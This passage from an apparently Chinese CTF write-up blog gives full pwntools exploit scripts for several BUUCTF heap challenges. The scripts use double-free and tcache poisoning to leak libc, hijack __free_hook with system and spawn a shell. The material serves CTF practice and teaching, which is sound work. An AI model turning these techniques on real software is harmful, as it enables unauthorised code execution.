class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port =<span class="number">26722</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/10xg $rebase(0x202060)</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line"><span class="meta">#name 0x100</span></span><br><span class="line">def add(size,content):</span><br><span class="line">    sla(b<span class="string">&quot;Your choice:&quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;size?&gt;&quot;</span>,str(size))</span><br><span class="line">    sa(b<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">free</span>(index):</span><br><span class="line">    sla(b<span class="string">&quot;Your choice:&quot;</span>, b<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Index:&quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    sla(b<span class="string">&quot;Your choice:&quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Index:&quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">    sla(b<span class="string">&quot;Your choice:&quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Index:&quot;</span>,str(index))</span><br><span class="line">    sa(b<span class="string">&quot;New content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,b<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x18</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(b<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libc_base=u64(ru(b<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,b<span class="string">&quot;\0&quot;</span>))+<span class="number">0x7f0e86c41000</span><span class="number">-0x7f0e8702d061</span></span><br><span class="line">add(<span class="number">0</span>,b<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">sla(b<span class="string">&quot;Your choice:&quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sla(b<span class="string">&quot;Index:&quot;</span>,str(<span class="number">2</span>))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x18</span>,p64(libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]))</span><br><span class="line">add(<span class="number">0x18</span>,p64(libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="hitb2018-gundam"><a href="#hitb2018-gundam" class="headerlink" title="hitb2018_gundam"></a>hitb2018_gundam</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#hitb2018_gundam">BUUCTF在线评测 (buuoj.cn)</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./gundam&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port =<span class="number">28534</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/xg $rebase(0x20208C)</span></span><br><span class="line"><span class="string">    x/10xg $rebase(0x2020A0)</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line"><span class="meta">#name 0x100</span></span><br><span class="line">def add(content):</span><br><span class="line">    sla(b<span class="string">&quot;Your choice : &quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;The name of gundam :&quot;</span>,content)</span><br><span class="line">    sla(b<span class="string">&quot;The type of the gundam :&quot;</span>,b<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">free</span>(index):</span><br><span class="line">    sla(b<span class="string">&quot;Your choice : &quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Which gundam do you want to Destory:&quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">    sla(b<span class="string">&quot;Your choice : &quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">    sla(b<span class="string">&quot;Your choice: &quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Note number: &quot;</span>,str(index))</span><br><span class="line">    sla(b<span class="string">&quot;Length of note: &quot;</span>,str(len(content)))</span><br><span class="line">    sa(b<span class="string">&quot;Enter your note: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line">add(b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(b<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">8</span>):</span><br><span class="line">    <span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line">sla(b<span class="string">&quot;Your choice : &quot;</span>, b<span class="string">&quot;4&quot;</span>)<span class="meta">#free 掉0x30</span></span><br><span class="line">add(b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">show()</span><br><span class="line">ru(b<span class="string">&quot;Gundam[0] :&quot;</span>)</span><br><span class="line">libc_base=u64(ru(b<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,b<span class="string">&quot;\0&quot;</span>))<span class="number">-0x7f41e1686c61</span>+<span class="number">0x7f41e129b000</span></span><br><span class="line">add(b<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line">add(p64(libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]))</span><br><span class="line">add(b<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">add(p64(libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="ciscn-2019-final-2"><a href="#ciscn-2019-final-2" class="headerlink" title="ciscn_2019_final_2"></a>ciscn_2019_final_2</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#ciscn_2019_final_2">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>题目还可以</p>
<p>一个傻逼double free题</p>
<p>delete check十分傻逼，指针没有清零，一旦创建另一个就可以free</p>
<p><img src="/BUUCTF%E5%88%B7%E9%A2%98%204e962de8d79c4b56a975bfc16738e51d/Untitled%2056.png#id=iDjSw&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
<p>需要show两次，第一次double free需要用来修改size泄露堆地址，第二次泄露libc地址，然后利用doublefree修改文件描述符</p>
<p>open只会在进程里面创建文件描述符，并不会生成FILE结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./ciscn_final_2&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port =<span class="number">27388</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    b *$rebase(0x10D9 )</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line">INT=<span class="number">1</span></span><br><span class="line">SHORTINT=<span class="number">2</span></span><br><span class="line">def add(choice,number):</span><br><span class="line">    sla(b<span class="string">&quot;which command?\n&gt; &quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> choice==INT:</span><br><span class="line">        sla(b<span class="string">&quot;short int\n&gt;&quot;</span>,b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">        sla(b<span class="string">&quot;your inode number:&quot;</span>,str(number))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(b<span class="string">&quot;short int\n&gt;&quot;</span>,b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">        sla(b<span class="string">&quot;your inode number:&quot;</span>,str(number))</span><br><span class="line"></span><br><span class="line">def <span class="built_in">free</span>(choice):</span><br><span class="line">    sla(b<span class="string">&quot;which command?\n&gt; &quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> choice==INT:</span><br><span class="line">        sla(b<span class="string">&quot;short int\n&gt;&quot;</span>,b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(b<span class="string">&quot;short int\n&gt;&quot;</span>,b<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">def show(choice):</span><br><span class="line">    sla(b<span class="string">&quot;which command?\n&gt; &quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> choice==INT:</span><br><span class="line">        sla(b<span class="string">&quot;short int\n&gt;&quot;</span>,b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(b<span class="string">&quot;short int\n&gt;&quot;</span>,b<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(INT,<span class="number">0x10</span>)</span><br><span class="line"><span class="built_in">free</span>(INT)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">32</span>):</span><br><span class="line">    add(SHORTINT,<span class="number">0x0</span>)</span><br><span class="line"><span class="built_in">free</span>(INT)</span><br><span class="line">add(SHORTINT,<span class="number">0x0</span>)</span><br><span class="line"><span class="built_in">free</span>(INT)</span><br><span class="line">show(INT)</span><br><span class="line">ru(b<span class="string">&quot;number :&quot;</span>)</span><br><span class="line">heap_addr=((<span class="type">int</span>(rld())+<span class="number">1</span>&lt;&lt;<span class="number">32</span>)&gt;&gt;<span class="number">32</span>)<span class="number">-0x1</span></span><br><span class="line">add(INT,heap_addr+<span class="number">0x10</span>)</span><br><span class="line">add(INT,<span class="number">0x421</span>)</span><br><span class="line">add(INT,<span class="number">0</span>)</span><br><span class="line"><span class="built_in">free</span>(INT)</span><br><span class="line">show(INT)</span><br><span class="line">ru(b<span class="string">&quot;number :&quot;</span>)</span><br><span class="line">libc_base=((<span class="type">int</span>(rld())+<span class="number">1</span>&lt;&lt;<span class="number">32</span>)&gt;&gt;<span class="number">32</span>)<span class="number">-1</span><span class="number">-0x3ebca0</span></span><br><span class="line">io_addr=libc_base+<span class="number">0x70</span>+libc.sym[<span class="string">&quot;_IO_2_1_stdin_&quot;</span>]</span><br><span class="line">add(INT,io_addr&amp;<span class="number">0xffffffff</span>)</span><br><span class="line">add(INT,<span class="number">0</span>)</span><br><span class="line"><span class="built_in">free</span>(INT)</span><br><span class="line">add(SHORTINT,<span class="number">0</span>)</span><br><span class="line"><span class="built_in">free</span>(INT)</span><br><span class="line">add(INT,heap_addr+<span class="number">0x10</span>)</span><br><span class="line">add(INT,<span class="number">0</span>)</span><br><span class="line">add(INT,<span class="number">0</span>)</span><br><span class="line">add(INT,<span class="number">666</span>)</span><br><span class="line">sla(b<span class="string">&quot;which command?\n&gt; &quot;</span>, b<span class="string">&quot;4&quot;</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="starctf2019-girlfriend"><a href="#starctf2019-girlfriend" class="headerlink" title="starctf2019_girlfriend"></a>starctf2019_girlfriend</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#starctf2019_girlfriend">BUUCTF在线评测 (buuoj.cn)</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./chall&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4526A</span>, <span class="number">0x45216</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line">elif <span class="string">&quot;2.27&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port = <span class="number">28487</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/20xg $rebase(0x202060)</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line">def add(size: <span class="type">int</span>, name: bytes, call: bytes):</span><br><span class="line">    sla(b<span class="string">&quot;choice:&quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;size of girl&#x27;s name\n&quot;</span>, str(size).encode())</span><br><span class="line">    sa(b<span class="string">&quot;her name:\n&quot;</span>, name)</span><br><span class="line">    sa(b<span class="string">&quot;input her call:\n&quot;</span>, call)</span><br><span class="line"></span><br><span class="line"># 可以<span class="type">double</span> <span class="built_in">free</span></span><br><span class="line">def <span class="built_in">free</span>(index: <span class="type">int</span>):</span><br><span class="line">    sla(b<span class="string">&quot;choice:&quot;</span>, b<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;the index:\n&quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line">def show(index: <span class="type">int</span>):</span><br><span class="line">    sla(b<span class="string">&quot;choice:&quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;the index:\n&quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">0x18</span>, b<span class="string">&quot;c&quot;</span> * <span class="number">0xC</span>)</span><br><span class="line">add(<span class="number">0x28</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">0x18</span>, b<span class="string">&quot;c&quot;</span> * <span class="number">0xC</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(b<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">libc_base = u64(ru(b<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>, b<span class="string">&quot;\0&quot;</span>)) - <span class="number">0x7FC758064CA0</span> + <span class="number">0x7FC757C79000</span></span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x28</span>, p64(libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]), b<span class="string">&quot;c&quot;</span>)</span><br><span class="line">add(<span class="number">0x28</span>, b<span class="string">&quot;/bin/sh\0&quot;</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x28</span>, p64(libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]), b<span class="string">&quot;c&quot;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="huxiangbei-2019-namesystem"><a href="#huxiangbei-2019-namesystem" class="headerlink" title="huxiangbei_2019_namesystem"></a>huxiangbei_2019_namesystem</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#huxiangbei_2019_namesystem">BUUCTF在线评测</a></p>
<p>见csdn</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"><span class="meta"># from LibcSearcher import LibcSearcheronline</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./huxiangbei_2019_namesystem&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x45216</span>, <span class="number">0x4526A</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line">elif <span class="string">&quot;2.27&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port = <span class="number">26766</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot; </span></span><br><span class="line"><span class="string">    b *0x400A45</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/20xg 